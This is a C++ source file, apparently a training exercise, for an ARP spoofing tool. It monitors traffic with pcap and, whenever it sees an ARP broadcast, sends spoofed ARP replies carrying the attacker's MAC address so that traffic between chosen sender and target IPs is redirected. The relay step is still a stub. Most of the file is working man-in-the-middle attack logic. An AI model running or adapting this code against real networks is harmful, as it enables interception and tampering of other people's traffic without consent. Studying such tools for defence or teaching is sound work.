#include <thread>
#include <vector>
#include <iostream>
#include <sstream>
#include <pcap.h>
#include "utils.h"
#include "protocoltype.h"
#include "init.h"
#include <mutex>
#include <typeinfo>
#include <map>
// ... 다른 필요한 헤더 포함 ...


void usage() {
    printf("syntax: send-arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}
std::map<std::string,std::string> ip_to_mac;
std::string attackerIp;
std::string attackerMac;

// Observer Interface
class Observer {
public:
    virtual void onArpBroadcastDetected(std::string sI,std::string tI,const char* dev,std::string sM, std::string mM) = 0;
    virtual void onIPv4PacketReceived(const u_char* packet,const char* dev,std::string tM) = 0;
};
class ArpSpoofingStrategy {
public:
    virtual void execute() = 0;
};

class RelayStrategy : public ArpSpoofingStrategy {
private:
    const u_char* p;
    const char* dev;
    std::string tM;
public:
    RelayStrategy(const u_char* pkt,const char* DEV,std::string tm) : p(pkt), dev(DEV), tM(tm) {}
    
    void execute() override {
        //relayPacket(p,dev,tM);  // TODO
    }
};

class SpoofingStrategy : public ArpSpoofingStrategy {
private:
    std::string sI;
    std::string tI;
    const char* dev;
    std::string sM;
    std::string mM;
public:
    SpoofingStrategy(std::string sdr,std::string trg,const char* DEV,std::string SM,std::string MM) : sI(sdr), tI(trg), dev(DEV), sM(SM), mM(MM) {}
    void execute() override {
        if(!sendArpSpoof(sI,tI,dev,sM,mM)){
            printf("send_error!\n\n");
        }; // TODO
    }
};

class ArpPacketHandler : public Observer { //
private:
    ArpSpoofingStrategy* strategy=nullptr;
public:
    ArpPacketHandler() {}

    void onArpBroadcastDetected(std::string sI,std::string tI,const char* dev,std::string sM,std::string mM) override {
        if(dynamic_cast<SpoofingStrategy*>(strategy) == nullptr) {
            setStrategy(new SpoofingStrategy(sI, tI, dev, sM, mM));
        }
        strategy->execute();
    }

    void onIPv4PacketReceived(const u_char* pkt,const char* dev,std::string tM) override {
        if(dynamic_cast<RelayStrategy*>(strategy) == nullptr) {
            setStrategy(new RelayStrategy(pkt, dev, tM));
        }
        strategy->execute();
    }

    void setStrategy(ArpSpoofingStrategy* newStrategy) {
        if (strategy) {
            delete strategy;  // 기존 전략 삭제
        }
        strategy = newStrategy;
    }

    ~ArpPacketHandler() {
        if (strategy) {
            delete strategy;  // 메모리 누수 방지
        }
    }
};

class ArpMonitor {
private:
    std::mutex mtx;
    std::vector<std::pair<std::string, std::string>> ipPairs;
    std::vector<std::thread> threads;
    Observer* observer= nullptr;

public:
    ArpMonitor(Observer* obs) : observer(obs) {}  // Observer를 생성자에서 초기화

    void addIpPair(const std::string& sender, const std::string& target) {
        ipPairs.push_back({sender, target});
    }

    void startMonitoring(const char* dev) {
        for (const auto& pair : ipPairs) {
            threads.push_back(std::thread(&ArpMonitor::monitorIpPair, this, dev, pair.first, pair.second));
        }

        for (auto& th : threads) {
            th.join();
        }
    }

private:
    void monitorIpPair(const char* dev, const std::string& sender, const std::string& target) {
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t *handle;

        // pcap 세션을 엽니다.
        handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == nullptr) {
            std::cerr << "Could not open device: " << errbuf << std::endl;
            return;
        }

        struct pcap_pkthdr header;
        const u_char *packet;

        while (true) {
            packet = pcap_next(handle, &header);
            if (packet == nullptr) {
                continue;
            }

            // 패킷을 분석하여 ARP나 IPv4 패킷인지 확인
            int protocolType=checkType(packet);
            
            if(protocolType==2){
                printf(" checkSend(pac) is %s\n sender is %s\n\n\n",checkSend(packet).c_str(),sender.c_str());
            }
            mtx.lock();
            if (protocolType==1&&isBroadcast(packet)) { //arp
                printf("arp broadcast is in\n\n");
                observer->onArpBroadcastDetected(sender,target,dev,ip_to_mac[std::string(sender)],ip_to_mac[attackerIp]);
            } else if (protocolType==2&&checkSend(packet)==sender) { //ipv4
                printf("sender ip is detected\n\n");
                observer->onIPv4PacketReceived(packet,dev,ip_to_mac[target]);
            }
            mtx.unlock();
        }
        pcap_close(handle);
    }
};
int main(int argc,char* argv[]) {
    if(argc!=2){
        usage();
        return -1;
    }

    std::cout << "Input pairs of sender's IP and target's IP you want in each line separated by a space. If you want to end, input 'N'\n";
    
    std::vector<std::pair<std::string, std::string>> ipPairs;
    std::string line, sender, target;

    while (true) {
        std::cout << "Enter sender's IP and target's IP: \n";
        std::getline(std::cin, line);
        std::istringstream iss(line);

        iss >> sender >> target;

        if (sender == "N" || sender == "n") {
            break;
        }

        if (!isValidIP(sender) || !isValidIP(target)) {
            std::cout << "Invalid IP format! Please input again.\n";
            continue;
        }

        ipPairs.push_back({sender, target});
    }

    std::cout << "\nInput ended.\n\n";

    for (const auto& pair : ipPairs) {
        std::cout << "Sender: " << pair.first << ", Target: " << pair.second << std::endl;
    }
    const char* dev = argv[1];

    ArpPacketHandler handler;
    ArpMonitor monitor(&handler);

    attackerMac=getMyMac(dev);  
    attackerIp=getMyIp(dev);

    ip_to_mac[attackerIp]=attackerMac;
    for (auto& pair : ipPairs) {
        monitor.addIpPair(pair.first, pair.second);
        ip_to_mac[pair.first]= getSenderMac(pair.first,dev,attackerMac);
        ip_to_mac[pair.second]=getSenderMac(pair.second,dev,attackerMac);
        printf("ip_to_mac[%s] : %s \n\n",pair.first.c_str(),ip_to_mac[pair.first].c_str());
    }

    // Initial setup
    monitor.startMonitoring(dev);
    
    // Simulate ARP broadcast detection
/*     handler.onArpBroadcastDetected();

    // Change strategy on the fly
    handler.setStrategy(&spoofing);
    handler.onArpBroadcastDetected(); */
    return 0;
}
